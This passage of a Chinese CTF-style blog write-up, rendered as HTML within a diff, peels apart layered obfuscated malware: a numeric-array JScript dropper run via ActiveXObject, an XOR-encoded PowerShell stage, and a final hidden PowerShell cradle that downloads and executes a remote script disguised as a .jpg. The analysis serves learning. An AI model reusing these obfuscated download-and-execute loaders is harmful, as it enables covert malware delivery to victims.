class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">658</span>, <span class="number">656</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">658</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">653</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">649</span>, <span class="number">703</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">702</span>, <span class="number">652</span>, <span class="number">658</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">657</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">649</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">653</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">658</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">655</span>, <span class="number">698</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">699</span>, <span class="number">699</span>, <span class="number">650</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">651</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">650</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">658</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">699</span>, <span class="number">700</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">658</span>, <span class="number">650</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">703</span>, <span class="number">655</span>, <span class="number">657</span>, <span class="number">703</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">698</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">657</span>, <span class="number">657</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">657</span>, <span class="number">652</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">657</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">699</span>, <span class="number">657</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">657</span>, <span class="number">701</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">699</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">651</span>, <span class="number">657</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">651</span>, <span class="number">699</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">652</span>, <span class="number">698</span>, <span class="number">656</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">702</span>, <span class="number">653</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">699</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">654</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">702</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">698</span>, <span class="number">658</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">703</span>, <span class="number">703</span>, <span class="number">702</span>, <span class="number">700</span>, <span class="number">702</span>, <span class="number">650</span>, <span class="number">658</span>, <span class="number">698</span>, <span class="number">698</span>, <span class="number">701</span>, <span class="number">698</span>, <span class="number">649</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">654</span>, <span class="number">702</span>, <span class="number">702</span>, <span class="number">703</span>, <span class="number">656</span>, <span class="number">640</span>, <span class="number">645</span>, <span class="number">640</span>, <span class="number">647</span>, <span class="number">724</span>, <span class="number">651</span>, <span class="number">726</span>, <span class="number">640</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">725</span>, <span class="number">633</span>, <span class="number">638</span>, <span class="number">633</span>, <span class="number">724</span>, <span class="number">633</span>, <span class="number">692</span>, <span class="number">700</span>, <span class="number">705</span>, <span class="number">698</span>, <span class="number">715</span>, <span class="number">694</span>, <span class="number">641</span>, <span class="number">692</span>, <span class="number">668</span>, <span class="number">712</span>, <span class="number">711</span>, <span class="number">719</span>, <span class="number">702</span>, <span class="number">715</span>, <span class="number">717</span>, <span class="number">694</span>, <span class="number">659</span>, <span class="number">659</span>, <span class="number">685</span>, <span class="number">712</span>, <span class="number">667</span>, <span class="number">722</span>, <span class="number">717</span>, <span class="number">702</span>, <span class="number">641</span>, <span class="number">637</span>, <span class="number">696</span>, <span class="number">647</span>, <span class="number">687</span>, <span class="number">698</span>, <span class="number">709</span>, <span class="number">718</span>, <span class="number">702</span>, <span class="number">645</span>, <span class="number">650</span>, <span class="number">655</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">699</span>, <span class="number">721</span>, <span class="number">712</span>, <span class="number">715</span>, <span class="number">633</span>, <span class="number">640</span>, <span class="number">651</span>, <span class="number">649</span>, <span class="number">653</span>, <span class="number">640</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">726</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">707</span>, <span class="number">712</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">633</span>, <span class="number">640</span>, <span class="number">640</span>, <span class="number">660</span>, <span class="number">639</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">718</span>, <span class="number">699</span>, <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">704</span>, <span class="number">641</span>, <span class="number">649</span>, <span class="number">645</span>, <span class="number">652</span>, <span class="number">642</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670</span>, <span class="number">671</span>, <span class="number">685</span>, <span class="number">670</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">718</span>, <span class="number">699</span>, <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">711</span>, <span class="number">704</span>, <span class="number">641</span>, <span class="number">652</span>, <span class="number">642</span>]);</span><br><span class="line"><span class="keyword">var</span> emGK = <span class="title function_">ioRjQN</span>([<span class="number">688</span>,<span class="number">684</span>,<span class="number">700</span>,<span class="number">715</span>,<span class="number">706</span>,<span class="number">713</span>,<span class="number">717</span>,<span class="number">647</span>,<span class="number">684</span>,<span class="number">705</span>,<span class="number">702</span>,<span class="number">709</span>,<span class="number">709</span>]);</span><br><span class="line"><span class="keyword">var</span> ioRjQN = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(emGK);</span><br><span class="line">ioRjQN.<span class="title class_">Run</span>(ohyLbg, <span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">#同样使用<span class="variable language_">console</span>.<span class="property">log</span>替换run，打印ohyLbg和emGK的内容</span><br></pre></td></tr></table></figure></div>
+
+<p>第三层，得到了一段pwsh代码</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EFTE</span> =([<span class="type">regex</span>]::Matches(<span class="string">&#x27;a5a9b49fb8adbeb8e19cbea3afa9bfbfec</span></span><br><span class="line"><span class="string">eee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8</span></span><br><span class="line"><span class="string">a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2</span></span><br><span class="line"><span class="string">a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9</span></span><br><span class="line"><span class="string">a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bf</span></span><br><span class="line"><span class="string">b8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5ad</span></span><br><span class="line"><span class="string">aea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5</span></span><br><span class="line"><span class="string">e2aab9a2f6f8fdfcfaf8e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec</span></span><br><span class="line"><span class="string">9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf</span></span><br><span class="line"><span class="string">7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b</span></span><br><span class="line"><span class="string">8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa</span></span><br><span class="line"><span class="string">3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9b</span></span><br><span class="line"><span class="string">ee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28</span></span><br><span class="line"><span class="string">fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb</span></span><br><span class="line"><span class="string">9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e</span></span><br><span class="line"><span class="string">181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a</span></span><br><span class="line"><span class="string">9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e</span></span><br><span class="line"><span class="string">4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f88</span></span><br><span class="line"><span class="string">8e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a</span></span><br><span class="line"><span class="string">9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9b</span></span><br><span class="line"><span class="string">ea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e</span></span><br><span class="line"><span class="string">6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f</span></span><br><span class="line"><span class="string">68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b</span></span><br><span class="line"><span class="string">9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e28</span></span><br><span class="line"><span class="string">5a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7</span></span><br><span class="line"><span class="string">&#x27;</span>,<span class="string">&#x27;.&#123;2&#125;&#x27;</span>) | % &#123; [<span class="built_in">char</span>]([<span class="type">Convert</span>]::ToByte(<span class="variable">$_</span>.Value,<span class="number">16</span>) <span class="operator">-bxor</span> <span class="string">&#x27;204&#x27;</span>) &#125;) <span class="operator">-join</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&amp; <span class="variable">$EFTE</span>.Substring(<span class="number">0</span>,<span class="number">3</span>) <span class="variable">$EFTE</span>.Substring(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;&amp;&#x27;是运行符，把他摘掉再让他显示变量值</span></span><br></pre></td></tr></table></figure></div>
+
+<p>第四层</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;<span class="variable">$env:SystemRoot</span>\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe&quot;</span></span><br><span class="line"><span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> </span><br><span class="line"><span class="literal">-ArgumentList</span> <span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;-ep&#x27;</span>,<span class="string">&#x27;Unrestricted&#x27;</span>,<span class="string">&#x27;-Command&#x27;</span>,<span class="string">&quot;Set-Variable 3 &#x27;&lt;http://challenge.xinshi.fun:41064/bestudding.jpg&gt;&#x27;;</span></span><br><span class="line"><span class="string">SI Variable:/Z4D &#x27;Net.WebClient&#x27;;</span></span><br><span class="line"><span class="string">cd;</span></span><br><span class="line"><span class="string">SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);</span></span><br><span class="line"><span class="string">SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);</span></span><br><span class="line"><span class="string">&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里jpg就是那个容器里的远程脚本，扒那里面的代码就好了</p>
